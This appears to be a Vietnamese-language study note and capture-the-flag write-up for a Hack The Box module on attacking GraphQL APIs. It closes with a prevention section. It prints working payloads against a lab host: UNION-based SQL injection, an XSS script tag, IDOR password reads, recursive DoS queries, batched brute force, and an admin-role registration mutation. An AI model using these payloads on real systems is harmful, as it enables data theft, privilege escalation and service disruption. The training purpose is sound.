---
title: "Module 17: Attacking GraphQL"
date: 2026-07-07 14:20:16 +0700
categories: [hack-the-box, web-penetration-tester-path]
tags: [ctf-challenges, red-team, htb, cwes]
---

## SECTION 1: Introduction to GraphQL
### Giới thiệu GraphQL

- Query language cho web API, thay thế REST
- Cho phép client fetch dữ liệu qua cú pháp đơn giản
- Hỗ trợ: đọc, cập nhật, tạo, xóa dữ liệu
- **Điểm khác biệt chính:** hoạt động trên **một endpoint duy nhất** xử lý toàn bộ query → tối ưu tài nguyên

### Basic Overview

- Endpoint phổ biến: `/graphql`, `/api/graphql`
- Có thể tương tác trực tiếp với endpoint (không qua frontend) → tìm lỗ hổng bảo mật
- Query chọn `fields` của `objects` theo `type` định nghĩa ở backend

#### Query cơ bản

graphql

```graphql
{
  users {
    id
    username
    role
  }
}
```

**Response:**

graphql

```graphql
{
  "data": {
    "users": [
      { "id": 1, "username": "htb-stdnt", "role": "user" },
      { "id": 2, "username": "admin", "role": "admin" }
    ]
  }
}
```

#### Query với Arguments (filter)

graphql

```graphql
{
  users(username: "admin") {
    id
    username
    password
  }
}
```

- Arguments dùng để lọc kết quả
- Fields có thể thêm/bớt tùy ý (ví dụ: đổi `role` → `password`)

#### Sub-querying (nested objects)

graphql

```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

**Response:**

graphql

```graphql
{
  "data": {
    "posts": [
      { "title": "Hello World!", "author": { "username": "htb-stdnt", "role": "user" } },
      { "title": "Test",        "author": { "username": "test",      "role": "user" } }
    ]
  }
}
```

- Field `author` trả về object user → có thể query nested fields của nó
## SECTION 2: Information Disclosure

### Identifying the GraphQL Engine

- Dùng **graphw00f** để fingerprint GraphQL engine qua malformed queries và error messages.

```bash
python3 main.py -d -f -t http://172.17.0.2
```

**Output mẫu:**

```
[!] Found GraphQL at http://172.17.0.2/graphql
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
```

- Tra cứu [GraphQL-Threat-Matrix](https://github.com/nicholasaleks/graphql-threat-matrix) để xem attack surface của engine đó.
- Nếu có **GraphiQL interface** tại `/graphql` → thuận tiện test query trực tiếp, không cần lo JSON syntax qua Burp.

---

### Introspection

- Tính năng built-in cho phép query cấu trúc schema của backend qua `__schema`.

#### Liệt kê tất cả Types

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

#### Liệt kê Fields của một Type

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

> Ví dụ: `UserObject` lộ fields `username`, `password` kiểu `String / SCALAR`.

#### Liệt kê tất cả Queries được hỗ trợ

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

#### Full Introspection Dump

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

- Paste kết quả vào **[GraphQL Voyager](https://graphql-kit.com/graphql-voyager/)** (CHANGE SCHEMA → INTROSPECTION) để visualize schema.
- Trong thực chiến → tự host Voyager, tránh leak dữ liệu nhạy cảm ra ngoài.

**Schema mẫu phát hiện được:**

| Type         | Fields đáng chú ý                                               |
| ------------ | --------------------------------------------------------------- |
| `Query`      | `users`, `posts`, `user`, `postByAuthor`, `post`                |
| `UserObject` | `uuid`, `id`, `username`, `password`, `role`, `msg`, `posts`    |
| `PostObject` | `uuid`, `id`, `title`, `body`, `category`, `authorId`, `author` |
  

#### Question 1
---

After executing an introspection query, what is the flag you can exfiltrate?
At fist, using graphQL voyager to examine structure of schema, discovered a secret object
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-91f11360e64aa94ec6a2fe9a388bbc4d.png)

Select it and get flag
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-b7ca13b344e41481a2bf39b4230cd563.png)
## SECTION 3: Insecure Direct Object Reference (IDOR)

- IDOR là lỗ hổng broken authorization phổ biến trong GraphQL, tương tự REST API.

### Identifying IDOR

- Enum web app để tìm query truy cập dữ liệu theo input của user.
- Khi xem profile, app gửi query dạng `user(username: "htb-stdnt")`.
- Thử thay username bằng user khác đã biết (vd: `test`) → nếu trả data → thiếu authorization check.

> **Lưu ý:** Escape dấu `"` bên trong GraphQL query khi gửi qua JSON.

### Exploiting IDOR

**Bước 1:** Dùng introspection xác định các fields của type `UserObject`:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

→ Phát hiện field `password` tồn tại trong `UserObject`.

**Bước 2:** Khai thác IDOR để lấy password của user khác:

```graphql
{
  user(username: "test") {
    username
    password
  }
}
```

→ Server trả về `password` của user `test` mà không có kiểm tra quyền.
#### Question 1
After following the steps in the section, what is the flag you can find in the admins password?

Access user profile
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-dee8cc166c0c5610c4cd8dc81698a639.png)

Try accessing test user, confirm vulnerability
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-625445312b088f39aaf3960a09c3d29a.png)

Get the flag
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-ea38c48749f6f05802eeab7477019a89.png)

## SECTION 4: Injection Attacks
### SQL Injection

- GraphQL dùng database → SQLi có thể xảy ra nếu arguments không được sanitize.
- Các query cần kiểm tra: `post`, `user`, `postByAuthor`.

**Xác định argument bắt buộc:** Gửi query không có argument → đọc error message.

**Xác nhận SQLi trên `user` query:**

graphql

```graphql
# Comment injection → vẫn trả kết quả cũ = dấu hiệu SQLi
{
  user(username: "htb-stdnt' --") {
    uuid
    username
    role
  }
}

# Single quote → SQL error → xác nhận lỗ hổng
{
  user(username: "htb-stdnt'") {
    uuid
    username
    role
  }
}
```

**Khai thác UNION-based SQLi:**

- `UserObject` có **6 fields** → UNION payload cần 6 cột.
- Field `username` là cột thứ 3 → dùng cột 3 để exfiltrate data.
- Dùng `GROUP_CONCAT` để lấy nhiều row cùng lúc.

graphql

```graphql
# Liệt kê tất cả table names
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

json

```json
{
  "data": {
    "user": {
      "username": "user,secret,post"
    }
  }
}
```

> Database có thể chứa data không expose qua GraphQL API → nên dump toàn bộ.

---

### Cross-Site Scripting (XSS)

- XSS xảy ra khi GraphQL response được insert vào HTML **không có sanitization**.
- Cũng kiểm tra **error messages** có reflect payload không.

**XSS qua error message** (query `post` nhận Int nhưng inject string):

graphql

```graphql
{
  post(id: "<script>alert(1)</script>") {
    id
    title
    body
    category
    author { username }
  }
}
```

→ Response `HTTP 400`, error message reflect XSS payload **không encode** → lỗ hổng tiềm năng.
> Truy cập `/post?id=<script>alert(1)</script>` → page break, XSS không trigger qua GET parameter.
### Question 1
Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find?
Trigger error
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-e3f3781342db9db36740a45904e7e8b8.png)

Get tables
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-99e9e8d5b5a3c5b24d43bb76b7a2e2ff.png)

Get columns from flag table
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-f0dc9d5dcc37f4b910d8a46ad13ce0a2.png)

Get flag
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-54ef251dac3b95faedf4bf8ef762af0e.png)

## SECTION 5: Denial-of-Service (DoS) & Batching Attacks

Tùy thuộc vào cấu hình của GraphQL API, các truy vấn được thiết kế đặc biệt có thể tạo ra phản hồi rất lớn, tiêu tốn nhiều tài nguyên xử lý và dẫn đến tình trạng từ chối dịch vụ (DoS).

### Denial-of-Service (DoS) Attacks

DoS có thể xảy ra khi tồn tại các mối quan hệ đệ quy trong schema.

Ví dụ:

- `UserObject.posts` → `PostObject`
    
- `PostObject.author` → `UserObject`
    

Tạo thành vòng lặp:

```text
User → Posts → Author → Posts → Author → ...
```

Kẻ tấn công có thể lặp lại quá trình này nhiều lần khiến kích thước phản hồi tăng theo cấp số nhân.

#### Ví dụ

Truy vấn tác giả của tất cả bài viết, sau đó lấy các bài viết của từng tác giả và tiếp tục lấy tên tác giả:

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

Do `posts` là một connection object nên cần sử dụng:

- `edges`
    
- `node`
    

để truy cập từng `Post`.

#### Truy vấn lồng nhau sâu

Có thể tiếp tục lặp:

```text
posts
└── author
    └── posts
        └── author
            └── posts
                ...
```

Mỗi lần lặp sẽ làm kích thước phản hồi tăng mạnh.

Một truy vấn đủ sâu có thể:

- Làm chậm máy chủ.
    
- Tiêu tốn nhiều CPU và RAM.
    
- Gây ảnh hưởng đến người dùng khác.
    
- Thậm chí làm GraphiQL hoặc dịch vụ bị treo.
    

#### Ý chính

Các mối quan hệ đệ quy trong schema GraphQL có thể bị lạm dụng để tạo ra các truy vấn có chi phí xử lý rất lớn, dẫn đến DoS.

---

### Batching Attacks

Batching là tính năng cho phép gửi nhiều truy vấn GraphQL trong một yêu cầu HTTP duy nhất.

#### Ví dụ Request

```http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Type: application/json

[
  {
    "query":"{user(username: \"admin\") {uuid}}"
  },
  {
    "query":"{post(id: 1) {title}}"
  }
]
```

#### Response

Phản hồi sẽ giữ nguyên cấu trúc của danh sách truy vấn:

```json
[
  {
    "data": {
      "user": {
        "uuid": "3"
      }
    }
  },
  {
    "data": {
      "post": {
        "title": "Lorem ipsum 1"
      }
    }
  }
]
```

### Lưu ý

Batching:

- Là tính năng được thiết kế sẵn của GraphQL.
    
- Không phải lỗ hổng bảo mật.
    
- Có thể bật hoặc tắt tùy cấu hình.
    

Tuy nhiên, batching có thể gây ra vấn đề bảo mật nếu được sử dụng trong các chức năng nhạy cảm như đăng nhập.

#### Kịch bản Brute Force

Giả sử:

- Endpoint giới hạn 5 request/giây.
    
- Mỗi request chỉ chứa một truy vấn đăng nhập.
    

Tốc độ brute-force thông thường:

```text
5 request/giây × 1 mật khẩu/request
= 5 mật khẩu/giây
```

Nếu sử dụng batching:

```text
1 request
├── login(password1)
├── login(password2)
├── ...
└── login(password1000)
```

Khi đó:

```text
5 request/giây × 1000 mật khẩu/request
= 5000 mật khẩu/giây
```

Điều này khiến cơ chế rate limit dựa trên số lượng request gần như mất tác dụng.

#### Ý chính

Batching không phải là lỗ hổng, nhưng có thể khuếch đại các cuộc tấn công brute-force bằng cách cho phép thực hiện nhiều thao tác trong một request duy nhất, từ đó vượt qua các cơ chế rate limiting thông thường.
## SECTION 6: Mutations

Ngoài việc đọc dữ liệu, GraphQL còn hỗ trợ **mutations** để thay đổi dữ liệu trên máy chủ.

Mutations có thể được sử dụng để:

- Tạo đối tượng mới.
    
- Cập nhật đối tượng hiện có.
    
- Xóa đối tượng hiện có.
    

### Mutations là gì?

Để xác định các mutation được hỗ trợ và các tham số của chúng, có thể sử dụng truy vấn introspection sau:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Kết quả cho thấy backend hỗ trợ mutation:

```text
registerUser
```

Mutation này yêu cầu một object đầu vào:

```text
RegisterUserInput
```

#### Xác định các trường của RegisterUserInput

Sử dụng truy vấn:

```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

Kết quả cho thấy có thể cung cấp các trường:

- `username`
    
- `password`
    
- `role`
    
- `msg`
    

#### Băm mật khẩu

Ứng dụng yêu cầu mật khẩu ở dạng MD5.

```bash
echo -n 'password' | md5sum
```

Output:

```text
5f4dcc3b5aa765d61d8327deb882cf99
```

#### Đăng ký người dùng mới

```graphql
mutation {
  registerUser(
    input: {
      username: "vautia",
      password: "5f4dcc3b5aa765d61d8327deb882cf99",
      role: "user",
      msg: "newUser"
    }
  ) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

Response trả về các trường được yêu cầu trong phần thân của mutation, cho phép kiểm tra lỗi.

Sau khi tạo thành công, có thể đăng nhập bằng tài khoản mới.

---

### Exploitation with Mutations

Để tìm kiếm vector tấn công thông qua mutations, cần kiểm tra:

- Tất cả mutation được hỗ trợ.
    
- Các input tương ứng của từng mutation.
    

Trong trường hợp này, mutation `registerUser` cho phép chỉ định trường:

```text
role
```

Điều này có thể dẫn đến leo thang đặc quyền nếu backend không kiểm tra giá trị của trường này.

#### Các role đã biết

Thông qua việc truy vấn người dùng hiện có, có thể xác định hai role:

- `user`
    
- `admin`
    

#### Tạo tài khoản admin

```graphql
mutation {
  registerUser(
    input: {
      username: "vautiaAdmin",
      password: "5f4dcc3b5aa765d61d8327deb882cf99",
      role: "admin",
      msg: "Hacked!"
    }
  ) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

Response phản hồi lại:

```text
role: admin
```

Điều này cho thấy việc leo thang đặc quyền đã thành công.

Sau khi đăng nhập bằng tài khoản mới, có thể truy cập:

```text
/admin
```

và sử dụng các chức năng dành riêng cho quản trị viên.

### Ý chính

- Mutations được sử dụng để thay đổi dữ liệu trên server.
    
- Có thể dùng introspection để xác định các mutation được hỗ trợ và các tham số của chúng.
    
- Việc kiểm tra các input của mutation rất quan trọng trong quá trình pentest.
    
- Nếu backend cho phép người dùng kiểm soát các trường nhạy cảm như `role`, có thể dẫn đến **Privilege Escalation**.
  

### Question 1

What is the flag you find in the admin dashboard?
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-d24d7b8772b2a230d0bab967ca34e20e.png)

Access and get flag
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-82355a72a145f5895a9621767ba2d175.png)

## SECTION 7: Tools of the Trade

Ngoài các công cụ phục vụ quá trình enumeration như:

- `graphw00f`
    
- `graphql-voyager`
    

còn có nhiều công cụ hỗ trợ kiểm tra và tấn công GraphQL API.

---

### GraphQL-Cop

GraphQL-Cop là công cụ kiểm tra bảo mật dành cho GraphQL API.

Sau khi clone repository và cài đặt các dependency cần thiết, có thể kiểm tra phiên bản:

```bash
python3 graphql-cop.py -v
```

Output:

```text
version: 1.13
```

#### Quét GraphQL API

Sử dụng tham số `-t` để chỉ định endpoint:

```bash
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```

Ví dụ kết quả:

```text
[HIGH] Alias Overloading
[HIGH] Array-based Query Batching
[HIGH] Directive Overloading
[HIGH] Field Duplication
[LOW] Field Suggestions
[MEDIUM] GET Method Query Support
[LOW] GraphQL IDE
[HIGH] Introspection
[MEDIUM] POST based url-encoded query
```

#### Các vấn đề được phát hiện

| Mức độ | Vấn đề                     | Tác động            |
| ------ | -------------------------- | ------------------- |
| HIGH   | Alias Overloading          | DoS                 |
| HIGH   | Array-based Query Batching | DoS                 |
| HIGH   | Directive Overloading      | DoS                 |
| HIGH   | Field Duplication          | DoS                 |
| LOW    | Field Suggestions          | Information Leakage |
| MEDIUM | GET Query Support          | CSRF                |
| LOW    | GraphiQL Explorer Enabled  | Information Leakage |
| HIGH   | Introspection Enabled      | Information Leakage |
| MEDIUM | POST url-encoded Query     | CSRF                |

#### Ý chính

GraphQL-Cop thực hiện nhiều kiểm tra cấu hình cơ bản và cung cấp một baseline tốt trước khi tiến hành kiểm thử thủ công.

---

### InQL

InQL là extension của Burp Suite, có thể cài đặt thông qua:

```text
BApp Store → InQL
```

Sau khi cài đặt thành công:

- Xuất hiện tab `InQL`.
    
- Thêm tab GraphQL trong:
    
    - Proxy History
        
    - Repeater
        

Điều này cho phép chỉnh sửa GraphQL query trực tiếp mà không cần thao tác với phần JSON bao quanh.

#### Sinh query tự động

Nhấp chuột phải vào request GraphQL:

```text
Extensions
└── InQL - GraphQL Scanner
     └── Generate queries with InQL Scanner
```

Sau khi quét, InQL thực hiện:

- Introspection.
    
- Thu thập schema.
    
- Liệt kê toàn bộ Queries.
    
- Liệt kê toàn bộ Mutations.
    

Thông tin được hiển thị trong tab InQL của host tương ứng.

#### Các chức năng nổi bật

- Tự động thực hiện introspection.
    
- Sinh query từ schema.
    
- Liệt kê Queries và Mutations.
    
- Hỗ trợ Batch Attack.
    
- Mở trực tiếp trong GraphiQL.
    
- Tích hợp với Burp Proxy và Repeater.
    

#### Ý chính

InQL giúp quá trình phân tích GraphQL API trong Burp Suite trở nên thuận tiện hơn bằng cách tự động thu thập schema và sinh các truy vấn cần thiết.

---

### Tổng kết

#### graphw00f

- Fingerprint GraphQL implementation.
    

#### graphql-voyager

- Trực quan hóa schema GraphQL.
    

#### GraphQL-Cop

- Kiểm tra các cấu hình bảo mật phổ biến.
    
- Phát hiện DoS, Information Leakage, CSRF,...
    

#### InQL

- Extension của Burp Suite.
    
- Tự động introspection.
    
- Sinh query và mutation.
    
- Hỗ trợ phân tích và tấn công GraphQL API.
## SECTION 8: GraphQL Vulnerability Prevention

Sau khi tìm hiểu các lỗ hổng thường gặp trong GraphQL, cần áp dụng các biện pháp phòng chống phù hợp để giảm thiểu rủi ro.

### Information Disclosure

Các biện pháp bảo mật chung cần được áp dụng để ngăn chặn rò rỉ thông tin.

#### Error Messages

- Tránh hiển thị lỗi chi tiết (_verbose error messages_).
    
- Chỉ trả về thông báo lỗi chung chung.
    

#### Introspection Queries

Introspection là công cụ mạnh để thu thập thông tin về schema.

Biện pháp phòng chống:

- Vô hiệu hóa introspection nếu có thể.
    
- Kiểm tra dữ liệu được tiết lộ thông qua introspection.
    
- Loại bỏ mọi thông tin nhạy cảm khỏi kết quả introspection.
    

#### Ý chính

Hạn chế tối đa thông tin mà attacker có thể thu thập từ lỗi và introspection.

---

### Injection Attacks

Để ngăn chặn các loại injection:

- SQL Injection
    
- Command Injection
    
- XSS
    

cần thực hiện kiểm tra đầu vào đầy đủ.

#### Input Validation

Mọi dữ liệu do người dùng cung cấp cần được coi là không đáng tin cậy cho đến khi được xử lý an toàn.

Ưu tiên:

```text
Allowlist > Denylist
```

#### Ý chính

Không tin tưởng dữ liệu đầu vào và luôn thực hiện validation/sanitization thích hợp.

---

### Denial-of-Service (DoS)

GraphQL dễ bị tấn công DoS và khuếch đại brute-force thông qua batching.

#### Các biện pháp giảm thiểu

##### Giới hạn độ sâu truy vấn

Ví dụ:

```text
Query Depth Limit
```

##### Giới hạn kích thước truy vấn

Ví dụ:

```text
Maximum Query Size
```

##### Rate Limiting

Áp dụng rate limit cho endpoint GraphQL nhằm ngăn chặn nhiều request liên tiếp trong thời gian ngắn.

##### Vô hiệu hóa Batching

Nếu có thể:

```text
Disable GraphQL Batching
```

Nếu batching bắt buộc phải sử dụng:

- Giới hạn query depth.
    
- Giới hạn số lượng query trong một request.
    

#### Ý chính

Các giới hạn về độ sâu, kích thước truy vấn và tốc độ gửi request là biện pháp quan trọng để chống DoS.

---

### API Design

Cần tuân theo các nguyên tắc bảo mật API thông thường để phòng chống:

- IDOR.
    
- Broken Access Control.
    
- Authorization bypass trên mutations.
    

#### Principle of Least Privilege

Áp dụng nguyên tắc:

```text
Least Privilege
```

Chỉ cấp quyền tối thiểu cần thiết cho người dùng.

#### Authentication

Nếu phù hợp với use case:

```text
GraphQL Endpoint
        ↓
Authentication
        ↓
Queries / Mutations
```

Endpoint GraphQL chỉ nên được truy cập sau khi xác thực thành công.

#### Authorization

Cần kiểm tra quyền trước khi thực thi:

- Query.
    
- Mutation.
    

Ngăn chặn người dùng thực hiện các thao tác mà họ không được phép.

#### Ý chính

Authentication và Authorization phải được triển khai đầy đủ để ngăn chặn các lỗi kiểm soát truy cập.

---

### Tổng kết

|Lỗ hổng|Biện pháp phòng chống|
|---|---|
|Information Disclosure|Generic error messages, vô hiệu hóa introspection|
|SQL Injection / Command Injection / XSS|Input validation, sanitization, ưu tiên allowlist|
|DoS|Query depth limit, query size limit, rate limiting|
|Batching-based Brute Force|Vô hiệu hóa batching hoặc giới hạn query depth|
|IDOR / Broken Access Control|Principle of Least Privilege|
|Unauthorized Queries/Mutations|Authentication và Authorization đầy đủ|

### Tài liệu tham khảo

OWASP GraphQL Cheat Sheet cung cấp thêm các khuyến nghị bảo mật chi tiết dành cho GraphQL APIs.
## SECTION 9: Skills Assessment
### Scenario

The tech company `Recovera Systems` has commissioned an external penetration test of its backend GraphQL API after taking its public website offline for maintenance in response to a recent security incident. Although the user-facing portion of the platform is temporarily disabled, the underlying GraphQL API remains fully active. The client wants to ensure that no vulnerabilities in its schema design, query handling, or data-exposure logic contributed to the breach or could enable future compromise once the site is restored. Try to apply the techniques learned in this module to identify and assess any vulnerabilities before the company re-enables the website.
### Question 1
Exploit the vulnerable GraphQL API to obtain the flag.
Access the page
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-d02cacef685197b005646bb066d389e5.png)
Identify graphql engine 
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-68451361e61bfa906d414d1fbc005f48.png)

Get general data
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-1283cda4f42a661a22bbc08218388af9.png)

Visualize using graphql voyager
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-90900b8d0c9419a9354a72fe88265dd7.png)

Navigating through the source code, identify suspicious request, but i didn't see any signal that indicate the vulnerability.
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-14d2a5285bf09e282fc58f9095b9ecd0.png)
Test sqli at search customer api. This api need api key of admin to work. So that, we need to archived it in active api keys object.
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-4f35ad323452c51fa8e0e86b95e1e874.png)

Get the flag.
![](/assets/img/module-17-attacking-graphql/module-17-attacking-graphql-0781ea0500420f8e2077c7889d286c5f.png)